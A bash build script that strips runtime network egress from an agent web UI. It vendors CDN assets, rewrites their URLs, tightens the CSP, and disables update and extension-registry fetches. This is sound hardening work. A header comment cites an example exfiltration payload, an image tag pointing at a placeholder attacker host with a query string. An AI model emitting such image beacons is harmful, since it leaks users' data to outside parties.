#!/usr/bin/env bash
# Crate fork: strip runtime egress from the agent webui (nesquena/hermes-webui).
#
# Runs at IMAGE BUILD time (agent/Dockerfile), after the upstream clone. The
# build itself may reach npm; the running container then never does.
#
#   1. Vendor the CDN assets (prism + its language components, xterm, pdf.js,
#      mermaid) into static/vendor/crate/ and point every jsdelivr URL there.
#   2. Tighten the CSP: no cdn.jsdelivr.net, no cloudflareinsights, no Google
#      Fonts, and no img-src https: (assistant output could otherwise embed
#      <img src=https://attacker/?q=...> as an exfiltration channel).
#   3. Hard-disable the update check (git fetch / api.github.com) and the
#      extension registry fetch (hermes-webui.github.io), whatever settings say.
#   4. Drop the .git dirs so nothing can `git fetch` at run time.
#
# Usage: crate-no-egress.sh <webui-dir> [<agent-runtime-dir>]
# See docs/crate/TELEMETRY-REMOVED.md.
set -euo pipefail

WEBUI="${1:?usage: crate-no-egress.sh <webui-dir> [<agent-runtime-dir>]}"
RUNTIME="${2:-}"
STATIC="$WEBUI/static"
VENDOR="$STATIC/vendor/crate"

# ── 1. Vendor CDN assets ─────────────────────────────────────────────────────
# name@version as jsdelivr serves them; each package lands in $VENDOR/<name>@<version>/
PKGS=(
  prismjs@1.29.0
  xterm@5.3.0
  xterm-addon-fit@0.8.0
  xterm-addon-web-links@0.9.0
  pdfjs-dist@4.9.155
  mermaid@10.9.3
)
mkdir -p "$VENDOR"
tmp="$(mktemp -d)"
for pkg in "${PKGS[@]}"; do
  dest="$VENDOR/$pkg"
  if [[ -d "$dest" ]]; then continue; fi
  ( cd "$tmp" && npm pack --silent "$pkg" >/dev/null )
  tgz="$(ls "$tmp"/*.tgz)"
  mkdir -p "$dest"
  tar -xzf "$tgz" -C "$dest" --strip-components=1
  rm -f "$tgz"
  echo "+ vendored $pkg"
done
rm -rf "$tmp"

# Rewrite https://cdn.jsdelivr.net/npm/<pkg>@<ver>/ to the vendored path. The
# integrity attributes are dropped with the URL: they pin jsdelivr's bytes, and
# the vendored files come from the npm tarball of the same version.
python3 - "$STATIC" <<'PY'
import pathlib, re, sys
static = pathlib.Path(sys.argv[1])
pat = re.compile(r"https://cdn\.jsdelivr\.net/npm/([a-z0-9-]+@[0-9][0-9.]*)/")
for p in sorted(list(static.glob("*.js")) + list(static.glob("*.html"))):
    name = p.name
    s = p.read_text()
    if "https://cdn.jsdelivr.net/npm/" not in s:
        continue
    n = len(pat.findall(s))
    if name.endswith(".js"):
        # In JS, resolve against the page so a Blob-module import (pdf.js) and
        # a reverse-proxy prefix (nginx /agent-api) both still work.
        lit = re.compile(r"'https://cdn\.jsdelivr\.net/npm/([a-z0-9-]+@[0-9][0-9.]*)/([^']*)'")
        s = lit.sub(lambda m: f"new URL('static/vendor/crate/{m.group(1)}/{m.group(2)}', document.baseURI).href", s)
    s = pat.sub(lambda m: f"static/vendor/crate/{m.group(1)}/", s)
    s = re.sub(r'\s+integrity="sha384-[^"]*"(\s+crossorigin="anonymous")?', "", s)
    s = re.sub(r"script\.integrity='sha384-[^']*';", "", s)
    p.write_text(s)
    print(f"+ {name}: rewrote {n} CDN URL(s)")
left = [str(p) for p in static.glob("*") if p.is_file() and "https://cdn.jsdelivr.net" in p.read_text(errors="ignore")]
if left:
    sys.exit(f"! CDN URLs remain in: {left}")
PY

# ── 2. CSP ───────────────────────────────────────────────────────────────────
python3 - "$WEBUI/api/helpers.py" <<'PY'
import pathlib, sys
p = pathlib.Path(sys.argv[1]); s = p.read_text()
for old, new in (
    (" https://cdn.jsdelivr.net https://static.cloudflareinsights.com blob:", " blob:"),
    ("worker-src blob: 'self' https://cdn.jsdelivr.net;", "worker-src blob: 'self';"),
    (" https://cdn.jsdelivr.net https://fonts.googleapis.com;", ";"),
    ("img-src 'self' data: https: blob:;", "img-src 'self' data: blob:;"),
    ("font-src 'self' data: https://fonts.gstatic.com;", "font-src 'self' data:;"),
    ('{_CSP_CONNECT_BASE} https://cdn.jsdelivr.net{extra_connect_src}', '{_CSP_CONNECT_BASE}{extra_connect_src}'),
):
    if old in s:
        s = s.replace(old, new)
    elif new not in s:
        sys.exit(f"! CSP patch target not found: {old!r}")
p.write_text(s)
print("+ CSP tightened")
PY

# ── 3. Update check + extension registry: hard off ───────────────────────────
python3 - "$WEBUI/api/updates.py" "$WEBUI/api/extensions.py" <<'PY'
import pathlib, sys
patches = [
    (sys.argv[1], "def check_for_updates(force=False, *, include_agent=True, channel=None):\n",
     '    return {"disabled": True}  # crate fork: no update checks\n'),
    (sys.argv[2], "def get_extension_registry() -> Dict[str, Any]:\n",
     '    return {"entries": [], "error": "registry_disabled"}  # crate fork\n'),
]
for path, sig, body in patches:
    p = pathlib.Path(path); s = p.read_text()
    if body in s:
        continue
    if sig not in s:
        sys.exit(f"! signature not found in {path}: {sig!r}")
    p.write_text(s.replace(sig, sig + body, 1))
    print(f"+ disabled {sig.split('(')[0][4:]}")
PY

# ── 4. No git metadata in the image ──────────────────────────────────────────
rm -rf "$WEBUI/.git"
if [[ -n "$RUNTIME" ]]; then rm -rf "$RUNTIME/.git"; fi
echo "+ removed .git from runtime clones"
